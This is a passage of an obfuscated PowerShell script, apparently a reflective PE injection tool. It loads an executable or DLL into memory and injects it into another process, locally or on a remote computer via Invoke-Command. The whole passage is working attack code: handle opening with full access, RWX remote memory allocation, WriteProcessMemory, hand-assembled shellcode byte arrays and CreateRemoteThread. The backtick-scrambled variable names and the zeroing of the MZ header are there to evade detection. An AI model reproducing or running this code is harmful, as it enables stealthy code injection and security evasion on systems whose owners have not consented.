                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        
        if (${Re`MO`Te`lOADiNG} -eq ${Tr`Ue})
        {
            [UInt32]${nUmby`T`Es`WrITT`EN} = 0
            ${S`UCCesS} = ${wIn32`FUNCtI`ons}.WriteProcessMemory.Invoke(${r`eMoTeP`ROC`haND`Le}, ${E`FfecTIVE`pEH`An`d`le}, ${P`eha`NdlE}, [UIntPtr](${Pe`iNfO}.SizeOfImage), [Ref]${num`ByTesWri`T`Ten})
            if (${S`UcceSS} -eq ${FaL`Se})
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        
        if (${PE`I`Nfo}.FileType -ieq "DLL")
        {
            if (${REM`OTeL`O`A`DING} -eq ${fA`lSE})
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                ${DL`LmA`iNpTR} = Add-SignedIntAsUnsigned (${pe`i`NfO}.PEHandle) (${pe`i`NfO}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                ${dllmAiN`DELe`g`A`TE} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                ${D`Llm`AIN} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${d`LlmA`In`PtR}, ${DllM`AI`NDELegA`TE})

                ${DLLM`A`in}.Invoke(${pE`INfo}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                ${dL`LMaINp`TR} = Add-SignedIntAsUnsigned (${eFf`e`cTIvePE`HaN`dLe}) (${P`e`iNfo}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if (${peIN`FO}.PE64Bit -eq ${tr`Ue})
                {
                    
                    ${ca`lL`dL`lMAINsC1} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    ${CA`LlD`L`lmainS`C2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    ${ca`L`lDLlMAIn`sC3} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    
                    ${CAL`Ldll`MAINs`c1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    ${CAL`LDLLmA`ins`c2} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    ${C`ALLDLlmAin`s`c3} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                ${sCL`en`G`Th} = ${C`A`l`l`DlLMainSc1}.Length + ${CA`LL`DLlmaInS`C2}.Length + ${cAl`lDl`LmAINs`C3}.Length + (${p`TRs`IzE} * 2)
                ${S`cp`SMeM} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${S`c`LENgTh})
                ${scp`s`meMor`Ig`INAL} = ${S`cPSmEM}

                Write-BytesToMemory -Bytes ${c`Al`LDLL`MAi`NSC1} -MemoryAddress ${scP`sM`Em}
                ${s`c`psmeM} = Add-SignedIntAsUnsigned ${s`cPS`MeM} (${CA`LLDl`LmA`I`NSc1}.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr(${e`F`F`ecTIVePEh`And`Le}, ${S`cP`sMEm}, ${fa`lSE})
                ${sCp`Sm`Em} = Add-SignedIntAsUnsigned ${sc`PSM`Em} (${p`TRsI`Ze})
                Write-BytesToMemory -Bytes ${CAlL`Dl`LMAINSc2} -MemoryAddress ${s`cps`meM}
                ${SC`psm`Em} = Add-SignedIntAsUnsigned ${S`cPSmem} (${CaLlD`lLMa`Ins`C2}.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr(${D`lLMain`Ptr}, ${Scp`s`mEm}, ${Fa`Lse})
                ${s`c`PSMem} = Add-SignedIntAsUnsigned ${sC`Psm`Em} (${PT`R`sIZe})
                Write-BytesToMemory -Bytes ${CA`ll`DlL`MAin`sc3} -MemoryAddress ${SC`PS`MEm}
                ${SCP`s`MEM} = Add-SignedIntAsUnsigned ${s`cP`SMEM} (${CAllD`LLmA`Ins`c3}.Length)

                ${rsCa`D`dr} = ${win32`FUn`c`T`IonS}.VirtualAllocEx.Invoke(${R`EmO`T`EPROchAn`d`lE}, [IntPtr]::Zero, [UIntPtr][UInt64]${sCLE`N`Gth}, ${wiN`32coNSta`NTs}.MEM_COMMIT -bor ${wi`N32consT`An`TS}.MEM_RESERVE, ${WI`N32cONS`TAn`TS}.PAGE_EXECUTE_READWRITE)
                if (${r`scA`Ddr} -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                ${s`Uc`CESS} = ${w`in32`FU`NC`TIoNs}.WriteProcessMemory.Invoke(${remOTe`PRo`Ch`A`Nd`lE}, ${rs`ca`DDr}, ${sC`pSm`eM`OriG`INAl}, [UIntPtr][UInt64]${sCLeNg`Th}, [Ref]${NU`m`By`Tes`wriT`TEn})
                if ((${s`UCC`ESS} -eq ${fA`LSe}) -or ([UInt64]${nu`mby`TE`SwrItt`En} -ne [UInt64]${s`C`leNGth}))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                ${RTH`Rea`Dh`A`NdLE} = Create-RemoteThread -ProcessHandle ${R`eMOT`e`prO`Ch`AndLE} -StartAddress ${RscA`d`Dr} -Win32Functions ${wiN3`2f`UncT`i`ONs}
                ${rEsu`lt} = ${WI`N32fUncti`oNs}.WaitForSingleObject.Invoke(${r`ThrEA`DhAN`DLE}, 20000)
                if (${RE`sulT} -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                ${wI`N32`FuNCt`Ions}.VirtualFreeEx.Invoke(${remO`TEP`RocHa`N`dle}, ${R`S`CadDR}, [UIntPtr][UInt64]0, ${Win32c`O`NStA`N`TS}.MEM_RELEASE) | Out-Null
            }
        }
        elseif (${p`eIN`FO}.FileType -ieq "EXE")
        {
            
            [IntPtr]${E`XED`on`Ebyt`epTR} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte(${EXE`dOn`E`BYTEP`TR}, 0, 0x00)
            ${O`V`erWRi`TTE`NmEmi`NfO} = Update-ExeFunctions -PEInfo ${p`EIN`Fo} -Win32Functions ${W`in32f`U`N`CtiOns} -Win32Constants ${w`in`32co`NST`AnTS} -ExeArguments ${e`xeAR`GS} -ExeDoneBytePtr ${EX`e`d`O`NEBYtEPtR}

            
            
            [IntPtr]${eX`eMai`N`pTR} = Add-SignedIntAsUnsigned (${P`einfO}.PEHandle) (${p`E`iNFo}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            ${W`i`N32fUnC`TIONS}.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${EX`emaI`NPtR}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while(${t`Rue})
            {
                [Byte]${tHRe`A`D`DONE} = [System.Runtime.InteropServices.Marshal]::ReadByte(${Exe`DoNeB`yt`EPTR}, 0)
                if (${tH`REAd`dONe} -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo ${Ove`Rw`RITTE`NM`Emi`N`Fo} -Win32Functions ${wi`N32F`UNc`Tio`NS} -Win32Constants ${WIn`3`2cOns`T`ANTS}
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @(${pe`i`NFO}.PEHandle, ${e`F`FE`CTivePEHA`NdlE})
    }


    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=${t`RuE})]
        [IntPtr]
        ${pE`Ha`ND`Le}
        )

        
        ${Win32`cO`Ns`TaNTS} = Get-Win32Constants
        ${Wi`N32`F`U`NCtIOns} = Get-Win32Functions
        ${W`iN32t`Ypes} = Get-Win32Types

        ${P`ein`FO} = Get-PEDetailedInfo -PEHandle ${PE`HAn`dlE} -Win32Types ${wI`N3`2tyPeS} -Win32Constants ${WI`N3`2CoNs`TAntS}

        
        if (${P`E`inFo}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]${Im`portd`Es`c`RIPToR`p`TR} = Add-SignedIntAsUnsigned ([Int64]${peIN`FO}.PEHandle) ([Int64]${pE`iNFo}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while (${T`RuE})
            {
                ${ImPORT`DE`S`CRIPTor} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${ImpOR`T`dESC`RiPt`o`RPTr}, [Type]${WIN3`2T`yp`ES}.IMAGE_IMPORT_DESCRIPTOR)

                
                if (${iM`Po`RT`D`eScrIPT`or}.Characteristics -eq 0 `
                        -and ${i`mpOrtdEs`c`RIp`ToR}.FirstThunk -eq 0 `
                        -and ${I`Mp`Ort`deScriptOr}.ForwarderChain -eq 0 `
                        -and ${ImP`ORT`DESc`RI`ptOR}.Name -eq 0 `
                        -and ${i`mpORTdesc`R`IPtor}.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                ${I`mPO`R`Td`LlpatH} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]${p`EiN`FO}.PEHandle) ([Int64]${Imp`ORTde`sC`RI`PToR}.Name)))
                ${IMp`o`RTdLl`hANdLe} = ${w`IN`32`Functi`ons}.GetModuleHandle.Invoke(${iMP`O`RTdLLp`ATh})

                if (${IMP`ORTDLl`hA`NdLe} -eq ${nu`ll})
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }

                ${s`UcC`ess} = ${Win`32`F`U`NctionS}.FreeLibrary.Invoke(${Im`pOR`TDL`lhan`DlE})
                if (${SUcC`esS} -eq ${fA`Lse})
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }

                ${imPORtd`ESCriP`T`ORpTR} = Add-SignedIntAsUnsigned (${I`MPort`DEs`CRIp`TOrPtR}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${wIN32`TYp`ES}.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        ${dl`lmaiN`pTR} = Add-SignedIntAsUnsigned (${P`E`iNFo}.PEHandle) (${PEIn`Fo}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        ${D`lLMAiNd`Ele`Gate} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        ${D`LlmA`IN} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${dLLm`AIN`p`Tr}, ${DllmAi`NDeleg`AtE})

        ${D`L`lmAin}.Invoke(${p`E`iNFo}.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        ${SUCC`eSs} = ${W`In3`2fU`NctI`ONS}.VirtualFree.Invoke(${PE`Ha`NDLe}, [UInt64]0, ${w`In32`co`NSt`AnTS}.MEM_RELEASE)
        if (${SUc`Ce`sS} -eq ${Fa`LsE})
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        ${wi`N32Fun`c`T`ioNs} = Get-Win32Functions
        ${wI`N32t`yp`ES} = Get-Win32Types
        ${wI`N32coN`StAN`TS} =  Get-Win32Constants

        ${Re`mOTEPr`ochAn`d`le} = [IntPtr]::Zero

        
        if ((${PROC`ID} -ne ${NU`Ll}) -and (${pRoc`id} -ne 0) -and (${prOC`NaME} -ne ${n`ULl}) -and (${PR`O`CNAME} -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif (${Pro`CNa`mE} -ne ${N`Ull} -and ${ProC`Na`mE} -ne "")
        {
            ${prOCEs`s`Es} = @(Get-Process -Name ${p`Roc`NAME} -ErrorAction SilentlyContinue)
            if (${pRoce`S`SEs}.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif (${PRoCe`s`Ses}.Count -gt 1)
            {
                ${P`RO`CiNfo} = Get-Process | Where-Object { ${_}.Name -eq ${p`ROcnA`ME} } | Select-Object ProcessName, Id, SessionId
                Write-Output ${pR`OCiN`FO}
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                ${p`R`OCiD} = ${pROCes`s`eS}[0].ID
            }
        }

        
        






        if ((${pRo`C`id} -ne ${n`ULl}) -and (${pro`cid} -ne 0))
        {
            ${R`e`MOtePR`ochandle} = ${wi`N3`2fUNcTI`Ons}.OpenProcess.Invoke(0x001F0FFF, ${fA`lSE}, ${PROc`Id})
            if (${Remot`EPRO`Ch`AN`Dle} -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        ${p`eHandLe} = [IntPtr]::Zero
        if (${REm`Ot`eP`RoCH`And`Le} -eq [IntPtr]::Zero)
        {
            ${p`Elo`AD`edinfO} = Invoke-MemoryLoadLibrary -PEBytes ${PEbyt`Es} -ExeArgs ${e`xea`RgS} -ForceASLR ${foR`CEA`SLR}
        }
        else
        {
            ${pe`L`oAded`inFO} = Invoke-MemoryLoadLibrary -PEBytes ${p`EB`YteS} -ExeArgs ${EX`EargS} -RemoteProcHandle ${reMOtePro`Ch`AN`dle} -ForceASLR ${f`Or`CeasLr}
        }
        if (${p`El`OAde`DiNFo} -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        ${p`EHAnd`LE} = ${Pe`LOa`DeD`iNfO}[0]
        ${RemO`TEP`EhAnDLE} = ${pELoAD`E`DIn`Fo}[1] 


        
        ${Pei`N`Fo} = Get-PEDetailedInfo -PEHandle ${Pe`hANd`LE} -Win32Types ${Wi`N3`2Types} -Win32Constants ${wiN32cons`TA`NtS}
        if ((${P`Ein`FO}.FileType -ieq "DLL") -and (${REmoTeP`ROcHa`Nd`lE} -eq [IntPtr]::Zero))
        {
            
            
            
            switch (${Fu`NcReT`UR`NTYpE})
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]${wStRI`NGFu`NcAdDr} = Get-MemoryProcAddress -PEHandle ${PE`hAn`dLE} -FunctionName "WStringFunc"
                    if (${wStri`N`GfUN`c`Addr} -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    ${wStR`I`Ngf`Uncd`elE`GaTe} = Get-DelegateType @() ([IntPtr])
                    ${W`S`TRinGFuNC} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ws`Tr`ING`FunCAdDr}, ${WSTRin`gFun`cDeL`EGaTe})
                    [IntPtr]${ouTP`U`TPTR} = ${Ws`TRInG`FuNC}.Invoke()
                    ${o`UtPUT} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${O`U`TPUT`Ptr})
                    Write-Output ${Ou`TPuT}
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]${S`T`RiNGFuN`ca`DdR} = Get-MemoryProcAddress -PEHandle ${PEhA`N`dlE} -FunctionName "StringFunc"
                    if (${s`TringF`U`Nca`ddR} -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    ${sTriN`GF`UnCd`elEg`ATe} = Get-DelegateType @() ([IntPtr])
                    ${St`Ri`NgfunC} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${sTRI`N`g`FuN`CaDDr}, ${strINgF`U`NCd`E`legATE})
                    [IntPtr]${o`U`TpuTpTR} = ${stR`InGf`UNc}.Invoke()
                    ${OU`Tput} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${OUT`putP`Tr})
                    Write-Output ${O`UT`put}
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]${vO`i`D`FunCaDDr} = Get-MemoryProcAddress -PEHandle ${P`eHAN`dle} -FunctionName "VoidFunc"
                    if (${vo`IDFunC`AdDr} -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    ${VO`idF`UnCDe`LEGA`TE} = Get-DelegateType @() ([Void])
                    ${voI`dfU`NC} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${v`o`iD`FunC`AddR}, ${V`OidFuncdelE`g`Ate})
                    ${VO`IdfUnc}.Invoke() | Out-Null
                }
            }
            
            
            
        }
        
        elseif ((${PEIN`Fo}.FileType -ieq "DLL") -and (${RE`MOTeP`ROCha`NDlE} -ne [IntPtr]::Zero))
        {
            ${VoI`dFUncA`ddr} = Get-MemoryProcAddress -PEHandle ${peH`A`NDlE} -FunctionName "VoidFunc"
            if ((${vOIDfU`NC`ADdR} -eq ${nU`ll}) -or (${v`OIDFu`N`cADdR} -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            ${v`OIDFU`NCADDr} = Sub-SignedIntAsUnsigned ${V`oIdf`UnCaD`dr} ${Pe`hAN`DLE}
            ${vOID`F`Un`caDdr} = Add-SignedIntAsUnsigned ${Voi`DF`UnCA`dDr} ${Re`m`O`T`EpEHAnDlE}

            
            ${n`ULL} = Create-RemoteThread -ProcessHandle ${R`em`OtEP`ROChAnDLE} -StartAddress ${VOID`FuNcAd`Dr} -Win32Functions ${WIN3`2FUN`CT`iOns}
        }

        
        
        if (${REm`ot`ePr`O`CHA`NdlE} -eq [IntPtr]::Zero -and ${p`eIn`Fo}.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle ${peHa`Nd`Le}
        }
        else
        {
            
            ${sU`Cc`EsS} = ${WI`N32FUNC`T`i`onS}.VirtualFree.Invoke(${pE`hAnd`LE}, [UInt64]0, ${Win3`2C`oNs`T`ANTS}.MEM_RELEASE)
            if (${s`UCcESS} -eq ${f`Al`sE})
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}


Function Main
{
    if ((${pScmDl`ET}.MyInvocation.BoundParameters["Debug"] -ne ${NU`LL}) -and ${psCmd`L`Et}.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        ${De`BuGp`Re`FEReN`Ce}  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    
    ${E`_magIc} = (${P`eBYt`es}[0..1] | ForEach-Object {[Char] ${_}}) -join ''

    if (${E_M`AG`ic} -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not ${doN`OtZEro`mz}) {
        
        
        ${P`eBy`Tes}[0] = 0
        ${PEB`yteS}[1] = 0
    }

    
    if (${EX`E`ArGS} -ne ${n`ULL} -and ${eX`eA`RGs} -ne '')
    {
        ${eXEar`Gs} = "ReflectiveExe $ExeArgs"
    }
    else
    {
        ${EX`EA`RGS} = "ReflectiveExe"
    }

    if (${CompuTe`R`N`AME} -eq ${n`UlL} -or ${co`mpute`RNAme} -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock ${rEmoTe`SCr`IpTb`Lo`CK} -ArgumentList @(${Peb`y`TES}, ${funcR`eTu`RN`TYpe}, ${pR`oc`ID}, ${p`RoCnA`Me},${f`O`RCEaSlR})
    }
    else
    {
        Invoke-Command -ScriptBlock ${R`EMOTES`crIpt`Bl`OcK} -ArgumentList @(${Pe`By`Tes}, ${fu`NCRe`TUrNty`pe}, ${PRO`c`id}, ${PrO`cN`AME},${F`ORCea`sLr}) -ComputerName ${CO`MpUt`eRnamE}
    }
}

Main
}
